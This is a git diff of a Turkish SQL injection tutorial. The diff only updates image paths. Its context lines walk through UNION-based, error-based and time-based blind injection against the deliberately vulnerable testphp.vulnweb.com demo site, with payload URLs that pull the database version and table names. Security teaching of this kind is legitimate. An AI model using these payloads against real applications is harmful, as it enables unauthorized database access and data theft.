@@ -80,12 +80,12 @@
 
 * 'http://testphp.vulnweb.com/listproducts.php?cat=1' Bu sekmenin aynısından bir tane daha açıyoruz ve arama kısmındaki  sorgusunun sonuna 1 yerine 2 yazıyoruz ve bu ekran çıkıyor:
 
-    ![alt text](image-5.png)
+    ![alt text](<WebSec101 0x01_ss/image-5.png>)
 
 
 * Ana sekmemizde (http://testphp.vulnweb.com/listproducts.php?cat=1) yazan yerin son kısmını (http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1) olarak değiştirip enter'a basıyoruz ve şöyle bir ekranla karşılaşıyoruz:
 
-    ![alt text](image-2.png)
+    ![alt text](<WebSec101 0x01_ss/image-2.png>)
 
 * Gelen bu uyarı aslında bize bir yol haritası çiziyor. 'Error: The used SELECT statements have a different number of columns' uyarısı '1 UNION SELECT 1' sorgularından getirilen kolon(column) sayılarının eşleşmediğini söylüyor. Eşleşmeme nedeni ise UNION SELECT sorgusunun çalışması için sorguladıklarının kolon sayısının eşit olmayışıdır.
 
@@ -99,21 +99,21 @@
 * referans sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1) ve ana sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11) en altına iniyoruz ve bir farklılık görüyoruz.
 
 Ana Sayfa:
-    ![alt text](image-6.png)   
+    ![alt text](<WebSec101 0x01_ss/image-6.png>) 
 
 Referans Sayfası:
-    ![alt text](image-7.png)
+    ![alt text](<WebSec101 0x01_ss/image-7.png>)
 
 * Ana sayfadaki en son kısımda 7 2 9 sayılarını görme sebebimiz aslında adresimizde kolon sayılarının o noktalarda eşleştiğini gösteriyor. Dolayısıyla 7 2 veya 9 olan kısımlarda biz manipülasyon yapabiliyoruz:
 
 * 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' 7 yerine versiyon yazdık ve 7 yazan yerde artık version bilgisini alıyoruz.
 
     ARTIK VERİ ÇIKARTMAYA BAŞLADIK
-    ![alt text](image-8.png)
+    ![alt text](<WebSec101 0x01_ss/image-8.png>)
 
 * Şimdi veri ekranımızı biraz daha temiz hale getirebiliriz. 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' adresimizde '='den sonra gelen yere '-9999999' yazarsak önceki kolonlardan kurtulmuş oluyoruz ve daha temiz bir görüntü elde ediyoruz:
 
-    ![alt text](image-9.png)
+    ![alt text](<WebSec101 0x01_ss/image-9.png>)
     * Bunun olma sebebi aslında biz 'http://testphp.vulnweb.com/listproducts.php?cat=1' sondaki id'yi değiştirmiş olduk. Onu çok büyük bir sayıyla değiştirdiğimiz vakit veriler kayboluyor. Yani referans sitesindekiyle de değişsek yine kolonlardaki veriler kaybolacak.
 
 * 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = database()' web adresini bu şekilde değiştiğimizde farklı bir veri akışı sağlayacağız. Buradaki 'FROM information_schema.tables WHERE table_schema = database()' sorguda aslında SQL'e ait sorguları kullanarak sitedeki kolon isimlerinin verisini çekebiliyoruz. Ve bu veriyi 7. sorgunun yerine table_name yazarak çekiyoruz.
@@ -122,7 +122,7 @@ türkçesi gibi:
 'FROM information_schema.tables WHERE table_schema = database()' = table_schema'nın veritabanına eşit olduğu yerden information_schema.tables'ı getir. Ve bu gelen bilgi de 7. sorgunun yerinde gösteriliyor çünkü oraya table_name yazdık.
 
 YENİ ÇEKTİĞİMİZ VERİLER:
-    ![alt text](image-10.png)
+    ![alt text](<WebSec101 0x01_ss/image-10.png>)
 
 
 * Burada aslında SQL injection saptandıktan sonra veri çekme işleminin ne denli detaylı hale gelebileceğini görmüş olduk. SQL parametlerine ve sorgularına hakim olunduğu taktirde adres kısmından farklı fonksiyonlar kullanılarak bir çok veri çekilebilir.
@@ -141,7 +141,7 @@ YENİ ÇEKTİĞİMİZ VERİLER:
 
 * Şimdi yine 'http://testphp.vulnweb.com/listproducts.php?cat=1' bu adrese geliyoruz ve id'nin(sonda 1 yazan yer) YANINA can'can yazıyoruz. Rastgele yazdım zaten amacımız error almak olduğu için. Adresin son hali http://testphp.vulnweb.com/listproducts.php?cat=1can'can oluyor. Bunu yazdığımızda şöyle bir error geliyor:
 
-    ![alt text](image-11.png)
+    ![alt text](<WebSec101 0x01_ss/image-11.png>)
 
 * Evet syntax error verdi hedeflediğimiz gibi. Şimdi burda amacımız bu error yazısını kullanarak veri çekmek. Bunu da syntax error verecek şekilde SQL kodları yazacağız. Yani hem syntax error'u çalıştıracağız hem de kod çalıştıracağız.
 
@@ -154,7 +154,7 @@ YENİ ÇEKTİĞİMİZ VERİLER:
 
 * Şöyle bir ekranla karşılaşıyoruz:
 
-    ![alt text](image-12.png)
+    ![alt text](<WebSec101 0x01_ss/image-12.png>)
 
 * Görüldüğü üzere veritabanından veri çekebiliyoruz. Artık syntax error bize 'acuart' verisini veriyor. Bu şekilde syntax error kullanarak veri çekmeyi görmüş olduk.
 
@@ -167,7 +167,7 @@ YENİ ÇEKTİĞİMİZ VERİLER:
     * Kullanılacak bazı ifadeler için ön bilgi:
     * 'boolean' verilen girdilere göre doğru veya yanlış çıktısını üretir. 1 doğrudur. 0 yanlış. Programlama dillerinde oldukça fazla bulunur.
     * 'ASCII' her yazı karakterinin ASCII kodu vardır.
-        ![alt text](image-13.png)
+        ![alt text](<WebSec101 0x01_ss/image-13.png>)
         Görüldüğü üzere harflerin, sayıların ve özel karakterlerin sayı karşılığında bir kodu bulunur. Bu kodlar ASCII kodlarıdır.
     * 'ascii()' karakterin ASCII kodunu döndürür. 
     * 'substring()' belirtilen ölçütlere göre bir dizenin bir kısmını çıkartır.
@@ -205,3 +205,4 @@ YENİ ÇEKTİĞİMİZ VERİLER:
     ```SQL 
         SELECT * FROM users WHERE id = IF(SUBSTRING(,,)1=1, sleep(5), 0) --> burda sorgu ile  veritabanından gelen cevap arasındaki süre 5 saniyeden fazlaysa aranılan değer bulundu demektir.
     
+##
